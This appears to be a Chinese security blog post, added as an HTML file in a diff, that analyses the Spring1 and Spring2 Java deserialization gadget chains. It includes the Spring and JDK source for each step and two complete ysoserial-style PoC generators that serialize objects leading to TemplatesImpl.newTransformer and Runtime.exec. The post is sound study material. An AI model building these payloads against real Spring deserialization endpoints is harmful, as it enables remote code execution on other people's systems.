@@ -1,0 +1,537 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Spring系列反序列化链 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Spring系列反序列化链 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Spring1反序列化
+前言
+学完Spring反序列化链才感觉到挖出这条链的大佬有多恐怖，光看都给我看晕了，不多说直接开始。
+pom.xml如下
+&lt;dependency&gt;
+    &lt;groupId&gt;org.sprin..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Spring系列反序列化链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="spring1反序列化">Spring1反序列化</h1>
+<h2 id="前言">前言</h2>
+<p>学完Spring反序列化链才感觉到挖出这条链的大佬有多恐怖，光看都给我看晕了，不多说直接开始。</p>
+<p>pom.xml如下</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>大致gadget chain，本文就分析到<code>TemplatesImpl.newTransformer()</code>,如果有地方分析的不对欢迎师傅们指出</p>
+<pre><code>/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()
+				SerializableTypeWrapper.TypeProvider(Proxy).getType()
+					AnnotationInvocationHandler.invoke()
+						HashMap.get()
+				ReflectionUtils.findMethod()
+				SerializableTypeWrapper.TypeProvider(Proxy).getType()
+					AnnotationInvocationHandler.invoke()
+						HashMap.get()
+				ReflectionUtils.invokeMethod()
+					Method.invoke()
+						Templates(Proxy).newTransformer()
+							AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()
+								ObjectFactory(Proxy).getObject()
+									AnnotationInvocationHandler.invoke()
+										HashMap.get()
+								Method.invoke()
+									TemplatesImpl.newTransformer()
+										TemplatesImpl.getTransletInstance()
+											TemplatesImpl.defineTransletClasses()
+												TemplatesImpl.TransletClassLoader.defineClass()
+													Pwner*(Javassist-generated).&lt;static init&gt;
+														Runtime.exec()
+ */
+
+</code></pre>
+<h2 id="methodinvoketypeprovider">MethodInvokeTypeProvider</h2>
+<p>在 Spring 核心包中存在这样一个内部类：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>，这个类实现了 TypeProvider 接口，是一个可以被反序列化的类。</p>
+<p>readObject代码如下，调用了ReflectionUtils.findMethod获取Method对象，调用invokeMethod执行方法。无参调用，如果可以调用到TemplatesImpl.newTransformer即可完成反序列化链了。</p>
+<pre><code class="language-java">private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
+    inputStream.defaultReadObject();
+    Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
+    this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
+}
+</code></pre>
+<h2 id="objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</h2>
+<p>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler类是实现了InvocationHandler和Serializable接口的一个类，invoke方法如下</p>
+<pre><code class="language-java">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+    String methodName = method.getName();
+    if (methodName.equals(&quot;equals&quot;)) {
+        return proxy == args[0];
+    } else if (methodName.equals(&quot;hashCode&quot;)) {
+        return System.identityHashCode(proxy);
+    } else if (methodName.equals(&quot;toString&quot;)) {
+        return this.objectFactory.toString();
+    } else {
+        try {
+            return method.invoke(this.objectFactory.getObject(), args);
+        } catch (InvocationTargetException var6) {
+            throw var6.getTargetException();
+        }
+    }
+}
+</code></pre>
+<p>反射调用了this.objectFactory.getObject()的method方法。</p>
+<h2 id="构造">构造</h2>
+<p>这条链是比较复杂的，因为设计到了三个动态代理，我在看的时候给我绕晕了。这里我先给出<mark>su18</mark>师傅的poc</p>
+<pre><code class="language-java">public class Spring1 {
+
+	public static String fileName = &quot;Spring1.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 使用 AnnotationInvocationHandler 动态代理
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		HashMap&lt;String, Object&gt; map = new HashMap&lt;&gt;();
+		map.put(&quot;getObject&quot;, tmpl);
+
+		// 使用动态代理初始化 AnnotationInvocationHandler
+		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);
+
+		// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl
+		ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(
+				ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);
+
+		// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject
+		// 并且会调用 method.invoke(返回值,args)
+		// 此时返回值被我们使用动态代理改为了 TemplatesImpl
+		// 接下来需要 method 是 newTransformer()，就可以触发调用链了
+		Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);
+		Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[0];
+		ofdConstructor.setAccessible(true);
+		// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler
+		InvocationHandler ofdHandler = (InvocationHandler) ofdConstructor.newInstance(factory);
+
+		// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler
+		// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法
+		// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+		// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+		Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{Type.class, Templates.class}, ofdHandler);
+
+
+		// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+		HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+		map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+		InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+		Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+		// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+		Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{typeProviderClass}, newInvocationHandler);
+
+
+		// 初始化 MethodInvokeTypeProvider
+		Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+		cons.setAccessible(true);
+		// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+		// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+		Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+		Field  field   = clazz2.getDeclaredField(&quot;methodName&quot;);
+		field.setAccessible(true);
+		field.set(objects, &quot;newTransformer&quot;);
+
+		SerializeUtil.writeObjectToFile(objects, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<p>我们最终是要执行到TeamplatesImpl的newTransformer方法，所以在invokeMethod方法中的method必须是要invokeMethod的Method对象，target必须是TeamplatesImpl对象</p>
+<p>在readObject方法中，method是通过findMethod获取，其中第一个参数是Class对象，我们这里应该是TeamplatesImpl的class，第二个参数是this.methodName，只需要在构造方法中传入newTransformer即可</p>
+<p>在su18师傅的poc中，他第一个参数传的是typeProviderProxy代理类，用的是newInvocationHandler，在调用this.provider.getType()的时候会调用到AnnotationInvocationHandler类的invoke方法，这个大家都很熟，动态代理，用AnnotationInvocationHandler的话他会返回memberValues中键为方法名的值，在这他返回的是另外一个代理类typeTemplateProxy</p>
+<pre><code class="language-java">public Object invoke(Object var1, Method var2, Object[] var3) {
+    String var4 = var2.getName();
+    Class[] var5 = var2.getParameterTypes();
+    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) {
+        return this.equalsImpl(var3[0]);
+    } else if (var5.length != 0) {
+        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+    } else {
+        switch (var4) {
+            case &quot;toString&quot;:
+                return this.toStringImpl();
+            case &quot;hashCode&quot;:
+                return this.hashCodeImpl();
+            case &quot;annotationType&quot;:
+                return this.type;
+            default:
+                Object var6 = this.memberValues.get(var4);
+                if (var6 == null) {
+                    throw new IncompleteAnnotationException(this.type, var4);
+                } else if (var6 instanceof ExceptionProxy) {
+                    throw ((ExceptionProxy)var6).generateException();
+                } else {
+                    if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) {
+                        var6 = this.cloneArray(var6);
+                    }
+
+                    return var6;
+                }
+        }
+    }
+</code></pre>
+<p>刚刚说到在调用完getType方法后会返回typeTemplateProxy这个代理对象，他用了ObjectFactoryDelegatingInvocationHandler这个类做动态代理，具体的invoke方法也说了，就是通过反射去调用<code>this.objectFactory.getObject()</code>的方法,然后getClass获取的就是那个typeTemplateProxy代理对象的getClass的结果，但是有的师傅可能会问那这里调用完的结果是<code>findMethod(typeTemplateProxy.getClass(),&quot;newTransformer&quot;)</code>，这样，没法获取到newTransformer的Method对象，这个其实在创建这个代理对象的时候就考虑到了，所以创建这个代理对象的时候第二个参数是<code>new Class[]{Type.class, Templates.class}</code>，保证了他能获取到newTransformer的Method对象,也能被强转为 TypeProvider.getType() 的返回值。然后就是调用invokeMethod方法</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220821192647037.png" alt="image-20220821192647037" loading="lazy"></figure>
+<p>这里的target传进来的时候是<code>this.provider.getType()</code>，也就是上面说到的那个代理对象typeTemplateProxy，这里会去调用typeTemplateProxy.newTransformer，因为是代理对象，就调用ObjectFactoryDelegatingInvocationHandler类的invoke方法，invoke方法中又调用到了<code>this.objectFactory.getObject()</code>，这里的objectFactory又是一个代理对象，会去调用AnnotationInvocationHandler类的invoke方法，返回的是我们前面<code>map.put(&quot;getObject&quot;, tmpl);</code>中的tmpl，就是TemplatesImpl对象，然后在<code>ObjectFactoryDelegatingInvocationHandler</code>类的invoke方法中的return语句里返回Templates.newTransformer,这条链就差不多是这样，很绕，需要有java动态代理知识的基础才能看懂，涉及了三个动态代理对象，套中套中套啊。</p>
+<h1 id="spring2反序列化">Spring2反序列化</h1>
+<p>pom.xml</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;
+    &lt;version&gt;4.1.4.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="jdkdynamicaopproxy">JdkDynamicAopProxy</h2>
+<p>JdkDynamicAopProxy类在Spring2链中的地位就是ObjectFactoryDelegatingInvocationHandler类在Spring1链中的地位一样，这两个类都同时实现了InvocationHandler, Serializable接口。其中，ObjectFactoryDelegatingInvocationHandler类的invoke主要的就是在invokeMethod的中的method.invoke方法中被调用，JdkDynamicAopProxy也一样，但是他只需要两个动态代理对象即可。具体看代码。</p>
+<pre><code class="language-java">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+    Object oldProxy = null;
+    boolean setProxyContext = false;
+    TargetSource targetSource = this.advised.targetSource;
+    Class&lt;?&gt; targetClass = null;
+    Object target = null;
+
+    Object var13;
+    try {
+        if (!this.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) {
+            Boolean var18 = this.equals(args[0]);
+            return var18;
+        }
+
+        if (!this.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) {
+            Integer var17 = this.hashCode();
+            return var17;
+        }
+
+        Object retVal;
+        if (!this.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) {
+            retVal = AopUtils.invokeJoinpointUsingReflection(this.advised, method, args);
+            return retVal;
+        }
+
+        if (this.advised.exposeProxy) {
+            oldProxy = AopContext.setCurrentProxy(proxy);
+            setProxyContext = true;
+        }
+
+        target = targetSource.getTarget();
+        if (target != null) {
+            targetClass = target.getClass();
+        }
+
+        List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);
+        if (chain.isEmpty()) {
+            retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);
+        } else {
+            MethodInvocation invocation = new ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain);
+            retVal = invocation.proceed();
+        }
+
+        Class&lt;?&gt; returnType = method.getReturnType();
+        if (retVal != null &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass())) {
+            retVal = proxy;
+        } else if (retVal == null &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) {
+            throw new AopInvocationException(&quot;Null return value from advice does not match primitive return type for: &quot; + method);
+        }
+
+        var13 = retVal;
+    } finally {
+        if (target != null &amp;&amp; !targetSource.isStatic()) {
+            targetSource.releaseTarget(target);
+        }
+
+        if (setProxyContext) {
+            AopContext.setCurrentProxy(oldProxy);
+        }
+
+    }
+
+    return var13;
+}
+</code></pre>
+<p>主要位于<code>target = targetSource.getTarget();</code>处，targetSource是通过<code>this.advised.targetSource</code>赋值，this.advised在构造方法中是一个AdvisedSupport类的参数，AdvisedSupport类的targetSource属性是通过setTargetSource方法赋值</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220821201710464.png" alt="image-20220821201710464" loading="lazy"></figure>
+<p>然后在<code>target = targetSource.getTarget()</code>处给target赋值</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220821201953299.png" alt="image-20220821201953299" loading="lazy"></figure>
+<p>然后调用了<code>AopUtils.invokeJoinpointUsingReflection(target, method, args);</code></p>
+<pre><code class="language-java">public static Object invokeJoinpointUsingReflection(Object target, Method method, Object[] args) throws Throwable {
+    try {
+        ReflectionUtils.makeAccessible(method);
+        return method.invoke(target, args);
+    } catch (InvocationTargetException var4) {
+        throw var4.getTargetException();
+    } catch (IllegalArgumentException var5) {
+        throw new AopInvocationException(&quot;AOP configuration seems to be invalid: tried calling method [&quot; + method + &quot;] on target [&quot; + target + &quot;]&quot;, var5);
+    } catch (IllegalAccessException var6) {
+        throw new AopInvocationException(&quot;Could not access method [&quot; + method + &quot;]&quot;, var6);
+    }
+}
+</code></pre>
+<p>在这里就是调用了TemplatesImpl.newTransformer，具体的话理解了Spring1，来看Spring2就非常简单了。</p>
+<p>poc还是拿的su18师傅的，因为我自己懒得打了哈哈哈，主要还是理解为主</p>
+<pre><code class="language-java">public class Spring2 {
+
+	public static String fileName = &quot;Spring2.bin&quot;;
+
+	public static void main(String[] args) throws Exception {
+
+		// 生成包含恶意类字节码的 TemplatesImpl 类
+		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();
+
+		// 实例化 AdvisedSupport
+		AdvisedSupport as = new AdvisedSupport();
+		as.setTarget(tmpl);
+
+		// 使用 AnnotationInvocationHandler 动态代理
+		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
+		constructor.setAccessible(true);
+
+		// JdkDynamicAopProxy 的 invoke 方法触发 TargetSource 的 getTarget 返回 tmpl
+		// 并且会调用 method.invoke(返回值,args)
+		// 此时返回值被我们使用动态代理改为了 TemplatesImpl
+		// 接下来需要 method 是 newTransformer()，就可以触发调用链了
+		Class&lt;?&gt;       clazz          = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
+		Constructor&lt;?&gt; aopConstructor = clazz.getDeclaredConstructors()[0];
+		aopConstructor.setAccessible(true);
+		// 使用 AdvisedSupport 实例化 JdkDynamicAopProxy
+		InvocationHandler aopProxy = (InvocationHandler) aopConstructor.newInstance(as);
+
+		// JdkDynamicAopProxy 本身就是个 InvocationHandler
+		// 使用它来代理一个类，这样在这个类调用时将会触发 JdkDynamicAopProxy 的 invoke 方法
+		// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类
+		// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法
+		Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{Type.class, Templates.class}, aopProxy);
+
+
+		// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类
+		HashMap&lt;String, Object&gt; map2 = new HashMap&lt;&gt;();
+		map2.put(&quot;getType&quot;, typeTemplateProxy);
+
+		InvocationHandler newInvocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map2);
+
+		Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);
+		// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy
+		Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
+				new Class[]{typeProviderClass}, newInvocationHandler);
+
+
+		// 初始化 MethodInvokeTypeProvider
+		Class&lt;?&gt;       clazz2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);
+		Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[0];
+		cons.setAccessible(true);
+		// 由于 MethodInvokeTypeProvider 初始化时会立即调用  ReflectionUtils.invokeMethod(method, provider.getType())
+		// 所以初始化时我们随便给个 Method，methodName 我们使用反射写进去
+		Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);
+		Field  field   = clazz2.getDeclaredField(&quot;methodName&quot;);
+		field.setAccessible(true);
+		field.set(objects, &quot;newTransformer&quot;);
+
+		SerializeUtil.writeObjectToFile(objects, fileName);
+		SerializeUtil.readFileObject(fileName);
+	}
+
+}
+</code></pre>
+<h1 id="参考">参考</h1>
+<p>感谢su18的师傅，给我学java安全相关的带来了很大的帮助。</p>
+<p>https://su18.org/post/ysoserial-su18-3/#%E6%80%BB%E7%BB%93-5</p>
+<p>https://github.com/su18/ysoserial/blob/master/src/main/java/org/su18/ysuserial/payloads/Spring1.java</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#spring1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Spring1反序列化</a>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#methodinvoketypeprovider">MethodInvokeTypeProvider</a></li>
+<li><a href="#objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0">构造</a></li>
+</ul>
+</li>
+<li><a href="#spring2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Spring2反序列化</a>
+<ul>
+<li><a href="#jdkdynamicaopproxy">JdkDynamicAopProxy</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/lan-ling-oa-rce-fen-xi/">
+              <h3 class="post-title">
+                蓝凌OA  RCE分析
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
